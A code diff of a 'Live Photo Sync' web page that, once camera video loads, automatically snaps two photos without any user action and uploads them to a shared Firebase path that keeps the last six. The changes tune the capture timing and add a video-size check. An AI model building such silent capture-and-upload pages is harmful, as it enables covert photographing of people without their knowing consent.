@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Live Photo Sync - Auto 2 Shot FIFO</title>
+  <title>Live Photo Sync - Fixed 2 Auto Shots</title>
   <style>
     body {
       background: black;
@@ -71,7 +71,7 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    const userId = "global"; // can be dynamic if needed
+    const userId = "global";
     const photoPath = `livephotos/${userId}`;
 
     const video = document.getElementById('video');
@@ -86,17 +86,20 @@
       video.srcObject = stream;
 
       video.onloadeddata = () => {
+        // Wait 500ms to ensure video is rendering
         setTimeout(() => {
-          capturePhoto();
+          capturePhoto(); // 1st photo
           setTimeout(() => {
-            capturePhoto();
-          }, 1000);
-        }, 300);
+            capturePhoto(); // 2nd photo after 2s
+          }, 2000);
+        }, 500);
       };
     });
 
     function capturePhoto() {
       if (captureCount >= 2) return;
+      if (!video.videoWidth || !video.videoHeight) return;
+
       captureCount++;
       console.log("Capturing photo", captureCount);
 
@@ -109,7 +112,7 @@
       db.ref(photoPath).once("value", snapshot => {
         let photos = snapshot.val() || [];
         photos.push(dataUrl);
-        if (photos.length > 6) photos = photos.slice(-6); // FIFO
+        if (photos.length > 6) photos = photos.slice(-6);
         db.ref(photoPath).set(photos);
       });
     }
@@ -143,4 +146,4 @@
     });
   </script>
 </body>
-  </html>
+</html>
